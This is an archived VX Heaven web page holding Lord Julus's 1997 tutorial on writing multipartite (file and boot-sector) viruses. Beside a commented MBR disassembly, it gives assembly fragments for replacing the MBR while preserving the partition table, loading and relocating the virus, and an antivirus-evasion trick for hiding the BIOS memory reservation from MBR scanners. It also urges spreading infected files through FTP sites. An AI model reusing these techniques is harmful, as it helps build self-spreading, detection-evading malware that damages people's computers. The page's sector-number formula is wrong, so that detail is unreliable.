@@ -1,0 +1,824 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Lord Julus 'A guide to multipartite infectors 1.5' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Lord Julus"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Lord Julus,guide to multipartite infectors 1.5, virus, error, partition, table, sectors, segment, hard, memory, entry, sector, word, push, floppy, record, active"/>
+<meta name="Description" content="So, what is a multipartite virus ? Let's give a brief description: A Multipartite virus is a COM/EXE/BS/MBR infector. Well, for those of you who know something about this, the definition should be good enough. For those of you new in the business it means a virus capable to infect files and also the Boot Sector (or Master Boot) on a Hard Drive and a Floppy Disk."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"02c682f2379d1d1638886c03feb44168d436f1c9-1498756359-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vlj01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>A guide to multipartite infectors 1.5</h1><p><a href="/lib/?lang=en&amp;author=Lord%20Julus"> Lord Julus</a><br/> <em> 1997</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vlj01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vlj01">Back to index</a>] [<a href="/lib/vlj01.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">Foreword</a></li>
+<li><a href="#p2">Basic notions</a></li>
+<li><a href="#p3">Going deeper</a></li>
+<li><a href="#p4">More to it</a></li>
+<li><a href="#p5">The Future</a></li>
+<li><a href="#p6">Final word</a></li>
+</ul>
+<p><em>FEATURING A FULLY COMMENTED DISASSEMBLY OF THE MASTER BOOT RECORD</em></p>
+<h2>Disclaimer</h2>
+<p>The following document is a study. It's only purpose is to be used in the virus research only. The author of this article is not responsible for any misuse of the things written in this document. Most of the things published here are already public and they represent what the author gathered across the years.</p>
+<p>The author is not responsible for the use of any of these information in any kind of virus.</p>
+<pre>
+				Lord Julus.
+</pre>
+<h2><a name="p1">Foreword</a></h2>
+<p>First of all, let's start with a little definition. So, what is a multipartite virus ? Let's give a brief description: A Multipartite virus is a COM/EXE/BS/MBR infector. Well, for those of you who know something about this, the definition should be good enough. For those of you new in the business it means a virus capable to infect files and also the Boot Sector (or Master Boot) on a Hard Drive and a Floppy Disk.</p>
+<p>Did you ever wondered why your usual COM/EXE viruses don't spread? Well, take a minute to think of it. How many times did you take an executable file from a friend ? I guess not very often. Now with all the games available on CD's, and all the utilities found on the WEB you don't have to use your floppies to 'borrow' executable files from friends. That's why the viruses don't spread. Here I come with the advantages of the Multipartite viruses (hereinafter called 'Multies'):</p>
+<ul>
+<li>Fast spreading: a simple disk inserted into an infected computer will carry the virus to another computer.</li>
+<li>File corrupting with no damage (as in usual viruses), giving you the possibility to upload your viruses onto FTP's or any other kind of WEB sites.</li>
+<li>Many difficulties involving the removal of the virus (see forward)</li>
+</ul>
+<p>So, you have to agree with me: a virus present into the boot of a computer, as well as into the files that live on it tend to render toward the perfect virus. Of course, as you will see along, there are many ways, with lots of advantages and disadvantages to do it. So, I'd say I should move on and start with the tutorial. This version of the tutorial is more boot sector related, but in further versions I will include a complete EXE/COM/SYS/BIN tutorial.</p>
+<h2><a name="p2">Basic notions</a></h2>
+<p>Maybe there is a lot of stuff on this written already, but I want to take my share, so I will try to present in an easy way everything involving Multies' creation.</p>
+<h3>1) Generalities</h3>
+<p>The data on the Hard Disk or floppy disk is stored using a particular format. This format is called the 'physical sector'.</p>
+<p>A physical sector is formed by a tripled:</p>
+<p>Cylinder, Head, Sector (CHS)</p>
+<p>A 'Track' is a circle described by a 'Head' on a Hard Disk's 'Side'. A 'Cylinder' represents all the tracks with the same radius on the Hard Disk (which are in the same time found under one Head). Usually the Hard Disks have 32 to 1024 cylinders (or tracks on side). The track number is a specific hard determined number and cannot be modified (it's actually determined by the Hard Disk motor characteristics).</p>
+<p>A 'Sector': The tracks are divided into circular arcs called sectors. The number of sectors on a Hard Disk is random and is determined when the HDD is formatted and it's determined by different things, especially by the coding scheme, usual values being:</p>
+<ul>
+<li>17 sectors per track (MFM coding)</li>
+<li>26 sectors per track (2,7 RLL coding)</li>
+<li>34 sectors per track (3,9 RLL coding)</li>
+<li>63 sectors per track (used widely in the present days)</li>
+</ul>
+<p>The amount of data storable on a sector is also different, but usually it's 512 bytes per sector.</p>
+<p>Usually, the maximum numbers for these are:</p>
+<ul>
+<li>MaxCYL = 1024</li>
+<li>MaxHEAD = 16</li>
+<li>MaxSec/track = 63</li>
+</ul>
+<p>The Cylinders are counted from 0 to MaxCYL-1, Heads are numbered from 0 to MaxHead-1, and Sectors are counted from 1 to MaxSect/track.</p>
+<p>So, as I said, a 'Physical Sector' is made by a (C,H,S) triplet. The first physical sector is at (0,0,1). In order to get the next physical sector one must increase the sector first until (0,0,MaxSect). After that the Head number increments and the Sector restarts from 1 and this goes on until (0,MaxHead,Maxsect). Finally, the Cylinder is incremented and the other two reset to 0 and 1 and this goes on until (MaxCyl, MaxHead, MaxSect). The number of a physical sector is calculated as follows:</p>
+<p>Sector number = (CYL*HEAD*SECT) + (HEAD*SECT) + (SECT-1)</p>
+<p>For example the triplet (3, 23, 7) gives the Physical Sector 650.</p>
+<h3>2) Useful tools</h3>
+<p>In order to proceed in writing a Multi, you must set up your working place and take a few tools around. What one should do is this:</p>
+<ul>
+<li>Get a clear empty floppy disk</li>
+<li>Do a Sys c: a:</li>
+<li>Copy FDISK.EXE and SYS.COM on it.</li>
+<li>Copy the following files from a TBAV package: TBUTIL.EXE, TBUTIL.LNG</li>
+<li>Run TBUTIL with the 'st' parameter and save the CMOS, BOOT and Partition Table on the disk.</li>
+<li>Put the DISKEDIT utility (from the Symantec's Norton Utilities package) on the disk too.</li>
+</ul>
+<p>Now, you're armed. Protect the disk and nothing can happen to your computer! If you screw up, by writing some trash on the HDD, just reboot with the disk and run TBUTIL with the parameter 're' to restore your data. Diskedit is very useful, especially when you want to verify whether your program did write something on the HDD or not. But, however be sure to do not write over the Root Directory Entry because you could loose data. Even if you do that the Norton Disk Doctor might fix the problem.</p>
+<h3>2) Important areas on the HDD</h3>
+<p>The important areas to know when starting a Boot related infector are the following:</p>
+<p>2.a. The Master Boot Record</p>
+<p>2.b. The Boot Record</p>
+<p>2.c. The first copy of FAT</p>
+<p>2.d. The second copy of FAT</p>
+<p>2.e. The entry in the Root Directory</p>
+<p>As you will see forward, it's very important to know all these, because each and everyone offers suitable places to store data on the HDD.</p>
+<h4>2.a) The Master Boot Record</h4>
+<p>At the Physical Sector 0 (i.e. the triplet (0,0,1)) on the HDD we find the Master Boot Record (MBR). Let's take a peek first at the MBR layout and then explain the stuff:</p>
+<p>Master Boot Record Layout:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="Master Boot Record Layout">
+<tr><th>Offset </th><th>Length </th><th>Meaning</th></tr>
+<tr><td>000h - 1BEh</td><td>1BEh </td><td>Code to load and execute the Boot Record for the active partition</td></tr>
+<tr><td>1BEh - 1CDh</td><td>10h </td><td>Entry for Partition #1</td></tr>
+<tr><td>1CEh - 1DDh</td><td>10h </td><td>Entry for Partition #2</td></tr>
+<tr><td>1DEh - 1EDh</td><td>10h </td><td>Entry for Partition #3</td></tr>
+<tr><td>1EEh - 1FDh</td><td>10h </td><td>Entry for Partition #4</td></tr>
+<tr><td>1FEh - 1FFh</td><td>02h </td><td>Partition Table Signature ('0AA55h')</td></tr>
+</table>
+<p>Partition Table Entry Layout</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="Partition Table Entry Layout">
+<tr><th>Offset</th><th>Length</th><th>Meaning</th></tr>
+<tr><td>00h </td><td>01h </td><td>If it's 80h than this is the active partition</td></tr>
+<tr><td>01h </td><td>03h </td><td>Partition address (head, sector, cylinder)</td></tr>
+<tr><td>04h </td><td>01h </td><td>System type (DOS 12bit/16bit/32bit FAT)</td></tr>
+<tr><td>05h </td><td>03h </td><td>Partition end address (head, sector, cylinder)</td></tr>
+<tr><td>08h </td><td>04h </td><td>Physical sector for partition beginning</td></tr>
+<tr><td>0Ch </td><td>04h </td><td>Partition length in sectors</td></tr>
+</table>
+<p>So, as you can see, the length of the MBR is 512 bytes, which means that it takes exactly one sector. Also, notice the signature at the end. That sign there marks that this is a valid partition. Try it out. Change it and the system will say 'Invalid Partition Table'.</p>
+<p>When the computer boots, the first thing that is done by the system is to load the MBR at address 0000:7C00 and it runs the code. Let's take a quick look at the code that the system executes upon boot (you can look at it yourself by using Diskedit: Look at Physical Sector 0, and choose only 1 sector too see and then save it using the 'Write to file...' tool to a file named MBR.COM and then use Turbo Debugger on the file to see what you've got). So, the code I disassembled and commented goes like this: (Mention: the operating system I was using at the time was Windows 95 OSR2)</p>
+<pre class="source">
+-----------MBR code disassembled by Lord Julus-----------
+start:
+	xor ax,ax		; Zero register ax
+	mov ss,ax		; Stack Segment = 0000h
+	mov sp,7C00h		; Stack Pointer = 7C00h
+	sti			; Enable interrupts
+	push ax			; Now make DS = ES = 0
+	pop es
+	push ax
+	pop ds
+	cld			; Clear direction
+	mov si,7C1Bh		; And start to copy code from offset 1Bh
+	mov di,061Bh		; to 0000:061Bh
+	push ax			; put 0 on the stack
+	push di			; and put 061Bh on the stack
+	mov cx,1E5h
+	rep movsb		; Rep when cx >0 Mov [si] to es:[di]
+	retf			; Return far (actually jump to 0000:061Bh)
+
+; Here is where the code goes on. This is the 1Bh offset. In this way the
+; area at 0000:7C00h is free and ready to receive the Boot Record
+
+	mov si, 07BEh		; The system is about to find the
+	mov cl, 4		; active partition table
+				; 0 means not active
+				; 80h means active (only one can be active)
+				; The offset of the first partition table
+				; is at 01BEh. SI is aligned to the new
+				; offset: 061Bh + 01BEh + 001Bh = 07BEh
+
+locloop_1: 			; CH = 0 here
+	cmp [si],ch		; and we take the first byte in the table
+	jl maybe_active_part	; Jump if &lt; ch (actually means [SI] could be
+				; 80h)
+	jnz Error_1		; -> Error !
+	add si,10h		; go to the next partition entry (+10h)
+	loop locloop_1		; Loop if cx > 0
+
+	int 18h			; go to ROM basic (never actually)
+
+maybe_active_part:
+	mov dx,[si]		; DX = active partition number
+	mov bp,si		; BP = entry for the active partition
+
+look:				; Since we must have only one active part.
+	add si,10h		; here we check to see if there are 2
+	dec cx			; marked as active
+	jz all_good		; Jump if CX = 0 -> partitions done !
+	cmp [si],ch		; [SI] = 0 ?
+	je look			; Jump if equal
+				; If not equal, there is another partition
+				; marked with something else but 0
+
+Error_1:
+	mov si,710h		; This points to 'Invalid partition table'
+				; actually to the second character and
+				; it's aligned at the next instruction
+
+hang:				; When the error message is fully displayed
+	dec si			; the program goes into an infinite loop here
+				; AL = 0; Lodsb increases SI and here SI
+				; is decreased again -> Infinite loop !
+
+display_error:			; This is the Error Display structure
+	lodsb			; String [si] to al
+	cmp al,0		; 0 marks the end of string
+	je hang			; Jump if equal
+
+	mov bx,7		; color: white
+	mov ah,0Eh		; Video display function 0Eh
+	int 10h			; write char from al, move cursor
+
+loc_7:
+	jmp short display_error	; and write another character !
+
+all_good:			; Here we know that we found an active
+				; partition table
+
+; Look at the Partition Table Layout to get this right
+
+	mov [bp+25h],ax		; Ax is still 0
+	xchg si,ax		; SI = 0
+	mov al,[bp+4]		; Load the system type into Al
+
+; Here come some strange checks which find out the system type
+
+	mov ah,6
+	cmp al,0Eh
+	je loc_10		; First system type
+
+	mov ah,0Bh
+	cmp al,0Ch
+	je loc_9		; Second system type
+
+	cmp al,ah
+	jne loc_12		; Third system type
+	inc ax
+
+loc_9:
+	mov byte ptr [bp+25h],6 ;
+	jnz loc_12		; Jump if not zero
+
+loc_10:
+	mov bx,55AAh		; About to check the installation of
+				; IBM/MS extensions
+
+; The next is an undocumented INT 13 which returns:
+; CF set if error
+; CF clear if ok, plus:
+; BX=0AA55h
+; AH = major version of extensions
+; (01h = 1.x, 20h = 2.0/EDD-1.0, 21h = 2.1/EDD-1.1)
+; AL = internal use
+; CX = API subset support bitmap
+; DH = extension version (v2.0+ ??? -- not present in 1.x)
+;
+; Bitfields for IBM/MS INT 13 Extensions API support bitmap:
+; Bit Description (Table 0196)
+; 0 extended disk access functions (AH=42h-44h,47h,48h) supported
+; 1 removable drive controller functions (AH=45h,46h,48h,49h,INT 15/AH=52h)
+; supported
+; 2 enhanced disk drive (EDD) functions (AH=48h,AH=4Eh) supported
+; extended drive parameter table is valid
+; 3-15 reserved (0)
+
+	push ax			; save ax
+	mov ah,41h
+	int 13h			; Undocumented installation check
+	pop ax			; and restore ax
+
+	jc loc_11		; Jump if error -> extensions not supported
+
+	cmp bx,0AA55h		; now compare
+	jne loc_11		; Jump if not equal -> not installed
+
+	test cl,1		; check if extended disk access functions
+	jz loc_11		; are supported
+
+	mov ah,al		; if we are here then the extensions are on
+	mov [bp+24h],dl		; DL holds the drive number !
+	mov word ptr ds:61Ah,1EEBh ; mark this here... ??
+
+loc_11:
+	mov [bp+4],ah		; rewrite the system type
+loc_12:
+	mov di,0Ah		; di = 0Ah
+
+; Now the system begins to load the Boot Record at 0000:SP (7C00h)
+
+loc_13:
+	mov ax,201h		; prepare to read from drive
+	mov bx,sp		; at ES:SP
+	xor cx,cx		; Zero register
+	cmp di,5		; di > 5 ?
+	jg loc_14		; Jump if >
+	mov cx,[bp+25h]		; otherwise, set in cx the cylinder and sector
+
+loc_14:
+	add cx,[bp+2]		; and increase the sector
+	int 13h			; Now read 1 sector to ES:BX
+				; al=1, ch=cyl, cl=sector, dh=head (0)
+loc_15:
+	jc loc_17		; Jump if carry Set -> some error
+	mov si,746h		; this points to 'Missing operating system'
+	cmp word ptr ds:7DFEh,0AA55h ; check if the Partition Signature is there
+	je loc_21		; Jump if equal -> OK
+				; the BOOT RECORD is loaded ! Jump to it
+
+sub di,5			; otherwise decrease DI
+	jg loc_13		; and try again. I guess all this stuff is
+				; trying to find the right sector.
+
+loc_16:
+	test si,si		;
+	jnz display_error	; Jump if not zero to error procedure
+	mov si,727h		; This points to
+				; 'Error loading operating system'
+	jmp short loc_7		; go to error procedure
+
+	cbw			; convert byte to word
+	xchg cx,ax		; exchange these
+	push dx			; save DX
+	cwd			; convert word to doubleword
+	add ax,[bp+8]		; Now add this double word that holds the
+	adc dx,[bp+0Ah]		; number of the physical sector for the
+				; Partition table start
+				; And we have it into DX:AX
+
+	call sub_1		; Go on
+	pop dx			; restore DX
+	jmp short loc_15	; If we are here then definitely there was
+				; an error
+
+loc_17:				; Here we come if there was a read error.
+	dec di			; decrement number of retries
+	jz loc_16		; Jump if zero to errors
+	xor ax,ax		; Now reset the disk
+	int 13h			; reset disk, al=return status
+
+	jmp short loc_13	; and try again
+
+	add [bx+si],al		; this must be some crap...
+	add byte ptr [di+56h],15h ; useless I mean.
+
+
+sub_1:
+	push si			; save SI and
+	xor si,si		; Zero register
+	push si			; save SI
+	push si			; again twice
+	push dx			; and all the rest
+	push ax
+	push es
+	push bx
+	push cx
+
+	mov si,10h		; SI = 10h = 16
+	push si			; save it
+	mov si,sp		; SI = Stack Pointer
+	push ax			; Push the Dword at DX:AX
+	push dx
+
+; the stack looks like this: SI,0,0,DX,AX,ES,BX,CX,10h,AX,DX
+
+; Another Extended undocumented function
+; IBM/MS INT 13 Extensions - EXTENDED READ
+; AH = 42h
+; DL = drive number
+; DS:SI -> disk address packet
+;
+;Format of disk address packet:
+;Offset Size Description
+; 00h BYTE 10h (size of packet)
+; 01h BYTE reserved (0)
+; 02h WORD number of blocks to transfer
+; 04h DWORD -> transfer buffer
+; 08h QWORD starting absolute block number
+; (for non-LBA devices, compute as
+; (Cylinder*NumHeads + SelectedHead) * SectorPerTrack +
+; SelectedSector - 1
+
+
+	mov ax,4200h		; Extended read function
+	mov dl,[bp+24h]		; DL = Drive number
+	int 13h			;
+
+	pop dx			; Restore this
+	pop ax
+
+	lea sp,[si+10h]		; Load effective addr
+	jc loc_20		; Jump if carry Set -> error
+
+locloop_18:
+	inc ax			; Increment the DWORD at DX:AX
+	jnz loc_19		; Jump if not zero
+	inc dx
+loc_19:
+	add bh,2		; and add a 2 to bh each time
+	loop locloop_18		; Loop until CX = 0
+
+	clc			; Clear carry flag
+loc_20:
+	pop si			; This doesn't make much sense. From my calc
+
+; the stack looks like this: SI,0,0,DX,AX,ES,BX,CX
+
+	retn			; this jumps to the old CX ??
+
+loc_21:				; this contains the error table
+	jmp short loc_22	; and a jump over it
+	db 'Invalid partition table', 0
+	db 'Error loading operating system', 0
+	db 'Missing operating system'
+	db 37 dup (0)
+
+loc_22:				; When we reached here it means
+				; that everything went OK. Now the
+				; Boot Record is loaded and the
+				; MBR is about to run it
+
+	mov di,sp		; DI = stack pointer
+	push ds			; put DS:DI on stack
+	push di
+	mov si,bp
+	retf			; Return far (actually jmp DS:DI)
+				; which is a jump to the Boot Record
+
+	db 52 dup (0) ; empty space
+
+				; Here starts the Partition Table
+	db 80h			; Active partition marker
+	db 01h			; Partition: Start Head
+	db 01h			; Sector
+	db 00h			; Cylinder
+	db 06h			; System Type
+	db 0Fh			; Partition: End Head
+	db 0FFh			; Sector
+	db 38h			; Cylinder
+	db 3Fh, 00h, 00h, 00h	; Number of Physical Sector
+	db 31h, 0B0h, 0Ch, 0	; Length of Partition in sectors
+	db 48 dup (0)		; the other partitions don't exist
+				;Total 40h bytes in the Partition Table
+
+	db 55h,0AAh		; and the sign
+
+----------MBR source over-----------
+</pre>
+<p>As you could see, all the code above does this:</p>
+<ul>
+<li>Checks if there is a correct partition table (only one partition is active and the 0AA55h sign is there).</li>
+<li>Locates the sector where the Boot Record for that partition is</li>
+<li>Loads that Boot Record</li>
+<li>Jumps to the Boot Record.</li>
+</ul>
+<p>If there is no correct partition table the 'Invalid partition table' error appears. If the system can't read (for various reasons) from the disk, the 'Error loading operating system' error pops up. Finally, if the Boot Record is not found then the 'Missing operating system' error is displayed.</p>
+<p>This is already a lesson about what you can really do in the MBR. As you saw, interrupts can be called when in boot. But only the interrupts between 0 and 1Fh are available (you noticed that the errors are displayed using the graphic interrupt 10h). In fact, during this phase, the interrupts can be hooked, memory can be allocated, there can be reads and writes to disk, and so on. But we'll discuss this later.</p>
+<h3>2.b) The Boot Record</h3>
+<p>The Boot Sector is the one loaded by the MBR into memory and the one to receive the command. After the MBR checks if everything is ok, this is where it jumps:</p>
+<p>Boot Sector Layout</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="Boot Sector Layout">
+<tr><th>Offset </th><th>Length </th><th>Meaning</th></tr>
+<tr><td>00h - 02h </td><td>03 </td><td>A JMP instruction to the loading sequence </td></tr>
+<tr><td>03h - 0Ah </td><td>08 </td><td>The name and version of the OS</td></tr>
+<tr><td>0Bh - 0Ch </td><td>02 </td><td>Sector size in bytes</td></tr>
+<tr><td>0Dh </td><td>01 </td><td>Cluster size in bytes</td></tr>
+<tr><td>0Eh - 0Fh </td><td>02 </td><td>Reserved sectors until the first FAT copy</td></tr>
+<tr><td>10h </td><td>01 </td><td>Number of FAT copies</td></tr>
+<tr><td>11h - 12h </td><td>02 </td><td>Number of directory entries in the ROOT</td></tr>
+<tr><td>13h - 14h </td><td>02 </td><td>Total sectors on disk (or partition)</td></tr>
+<tr><td>15h </td><td>01 </td><td>Disk type</td></tr>
+<tr><td>16h - 17h </td><td>02 </td><td>FAT size in sectors</td></tr>
+<tr><td>18h - 19h </td><td>02 </td><td>Sectors on cylinder (track)</td></tr>
+<tr><td>1Ah - 1Bh </td><td>02 </td><td>Number of heads (sides)</td></tr>
+<tr><td>1Ch - 1Fh </td><td>04 </td><td>Hidden sectors</td></tr>
+</table>
+<p>What are we interested in are the BPB and the Extended BPB with useful information. The meaning of BPB is 'BIOS Parameter Block'. The jump to the loading sequence is a jump that goes directly to load the operating system.</p>
+<h3>2.c) Other</h3>
+<p>Usually on the HDD there coexist 2 copies of the FAT (File allocation table). They have a specific length that can be found in the BPB (sectors per FAT) and the second important value to know is sector per cluster (or allocation unit). The two copies of the FAT are one after the other. The second copy of the FAT is only to prevent the loss of data. Somebody could write the data here and then stealth by redirecting the reads from the second FAT copy to the first FAT copy (remember that NDD tells the user if the FAT copies are not the same). The bad thing about this is the hard way of finding the place of the second copy and reading it only using the INT 13. After the FAT, the next thing on disk is the Directory Entry into the Root. You also have data about this in the BPB. A good place to hide something here is at the end of the Root Entry (e.g. at end of root entry - virus size). I will speak a little later about this stuff.</p>
+<h2><a name="p3">Going deeper</a></h2>
+<p>Now that we know all the basic stuff, here is the first question that pops in mind when writing a boot or multi virus: Where do I store my code? Here are the places I can think of:</p>
+<ol>
+<li>In the MBR itself</li>
+<li>In the Boot itself</li>
+<li>In the root directory entry</li>
+<li>In the second FAT copy</li>
+</ol>
+<h3>1. Infecting the MBR</h3>
+<p>Up above you have an almost complete description of the code into the MBR. So, the MBR is located at Physical Sector (0,0,1). The Boot Record can be found at (0,1,1), but this is true only if the first partition is active. If there are more than 1 partitions and another one is active, you should check and see the address of the Boot Record for that partition. Anyway, between (0,0,1) and (0,1,1) we have 62 free sectors. That would make an amount of 62 * 512 = 31744 bytes, more than anyone could desire for his virus.</p>
+<p>The infection of the MBR can be done in 2 ways:</p>
+<ol type="a">
+<li>Save the original MBR in the free zone and put the viral code in it's place then read it from the free zone</li>
+<li>Alter the original MBR making it to load the virus instead of the Boot Record and make the virus itself to load the Boot</li>
+</ol>
+<p>The first method requires from you to put in the 510-th byte of the virus the sequence '0AA55h' in order to mark this as a valid partition table. Second of all, the system can no longer be booted from a floppy disk. If you boot using method a) from a floppy disk and try to change the drive to C, you will get 'Invalid drive specification'. This problem can be solved easily: simply start your virus like this:</p>
+<pre class="source">
+start:
+	jmp over_partition
+	db 18h dup (0)		; 1bh - 3 bytes (the jmp opcode)
+part_table:
+	db 1E5h dup (0)		; the rest until 200h
+over_partition:
+	...			; the rest of virus
+</pre>
+<p>When the virus is about to write itself over the original MBR all it has to do is copy all the stuff from 1BEh until 200h at the part_table address. In this way we have the partition table in its place and the drive C is accessible also if booted from floppy disk. I would say that this approach is one of the best. The virus is not obvious (because the drive C works), but it's easier to remove (also because drive C is accessible). Here you must combine the Int 13h with special anti-tunneling routines, otherwise an AV product may trace the Int 13h and go around your stealth routines.</p>
+<p>Actually this code is not quite ok... That's because when the system boots it only loads exactly 1 sector (e.g. 200h bytes). This means that the JMP over_partition will jump after the 200h bytes, e.g. somewhere into the void! In order to really fix this we should do something like this:</p>
+<pre class="source">
+	jmp realstart
+				;(variables here)
+realstart:
+
+;(go resident part here) -> ES = new segment for virus
+
+	mov ah, 02h		; load the entire virus from MBR/BS
+	mov al, sector_len	; to the new segment (ES) at offset
+	mov dh, 0		; 0, as the system only loads one
+	mov cx, 1		; sector and the virus occupies more
+	mov bx, 0
+	int 13h
+
+over_this:
+	push es
+	lea ax, go_in_new_segment ; start over in the ES segment
+	push ax			; to free up the 007ch area
+	retf
+
+old_partition_table db 200h dup (0) ; this area is needed to preserve the
+				; partition table
+Go_in_new_segment:
+</pre>
+<p>Of course, in this way, the beginning of your virus will look like this:</p>
+<pre class="source">
+    .----------------------.
+(1) | Virus loader         | --> this should be smaller then 1BEh bytes
+    .----------------------.
+    .----------------------.
+(2) | 200h bytes reserved  | --> the reserved area for partition table
+    .----------------------.
+(3) | Rest of virus        | --> and the rest of the code goes here
+    :                      :
+    :                      :
+    '----------------------'
+</pre>
+<p>After the loading of the virus into the new segment and the jump to the new segment we find ourselves in the (3) zone. Here we make a read of the original MBR from where we save it and we put it entirely into the (2) zone. But, in order to have the correct partition table, we must shift up the (2) zone with an amount that equals the length of the (1) zone. The process can be described very well like this:</p>
+<p>In this easy way, the partition table is 'aligned' so the first 200h bytes end with a valid partition table. More, some parts of the original MBR still stay on (depends on how much you can optimize the virus loader) and many AV will confuse it with a valid MBR. Personally I tried with the above method on TBAV and it didn't flag anything. Of course, you need to use some strange approaches in order to hide your code.</p>
+<h3>2. Infecting the Boot</h3>
+<p>This is seems easier then the MBR infection because there are no checks done by the system. But, again, you must determine correctly the address of the boot record. Otherwise the system will hang. What you need to do is to save the original Boot in a free area and then paste your viral code over the boot. The MBR will load your virus when the computer boots and will give it the control. After the virus is over with it's job it should load the original boot from the free zone and jump to it.</p>
+<h3>3. The real way to do it</h3>
+<p>Now let's get closer and analyze a little what your virus should exactly do when it starts. First, let's do not forget that we are talking about Multipartite Viruses here. This means that our virus should be able to 'live' in the Boot areas and in the files as well. The usual way to check if you are in boot or in a file is to check the word at PSP:0000 like this:</p>
+<pre class="source">
+	cmp word ptr es:[0], 20CDh ; this is the marker for a
+	je in_file		; valid PSP
+
+in_boot:
+	... (boot sequence)
+in_file:
+	... (file sequence)
+</pre>
+<p>First let's take a look at the 'in boot' part.</p>
+<p>Let's assume this is a MBR replacer virus. This means that it saves the original MBR somewhere else and now it stays at Physical Sector 0. The system loads it and it is given command. The first thing usually done is the set up of the stack. Now, this is not really necessary, but it's done anyway:</p>
+<pre class="source">
+	cli
+	xor ax, ax
+	mov ss, ax
+	mov sp, 7C00h
+	sti
+</pre>
+<p>As you can see, the MBR does this itself. It's not really necessary, but we need it in order to make some comparitions later. Like, for example if you choose not to use many flags, later you can compare SP with 7c00h and if it's equal, then you are in boot.</p>
+<p>The next thing to do here is to reserve some memory for the virus. We assume that the Para_vir_len variable was set, like this:</p>
+<pre class="source">
+Para_vir_len = (finish - start)/8 ; virus length in paragraphs.
+				; We divide by 8 instead of 16
+				; because we need double space
+				; in memory !
+
+	xor ax, ax		; reserve memory for virus
+	mov ds, ax		; by substracting
+	mov ax, Para_vir_len
+	sub word ptr ds:[413h], ax ; the virus length
+	int 12h			; get memory in paragraphs
+	shl ax, 6		; make it in bytes
+	mov es, ax		; ES = new segment
+	mov cx, finish-start	; length of virus
+	push cs			; set the source
+	pop ds
+	mov si, 7c00h
+	mov di, 0
+	rep movsb		; ds:si > es:di
+</pre>
+<p>This works if your virus is only one sector length. If it's more than one sector, simply reserve memory and then read the virus to ES:0. This particular part is very important. Almost any MBR scanner will notice the decreasing of the word at 0000:0413 (which is the BIOS address where the total available memory is hold), and will pop up a warning. I figured out a nice way to do this:</p>
+<ul>
+<li>set BX = a random number</li>
+<li>get another number that equals 0413h - BX (wrapped around 0, of course), let's call it L.</li>
+<li>make this code:
+<pre class="source">
+	int 12h			; ax holds memory in paragraphs
+	sub ax, 1
+	xchg ax, word ptr ds:[BX + L]
+</pre>
+<p>I hear cries for an example:</p>
+<pre class="source">
+	mov bx, 0F0F5h
+	int 12h
+	sub ax, 1
+	xchg ax, word ptr ds:[BX + 131Eh]
+</pre></li>
+</ul>
+<p>Notice that 0F0F5h + 131Eh = FFFF0413h (as a doubleword) but as a word it's exactly 0413h!</p>
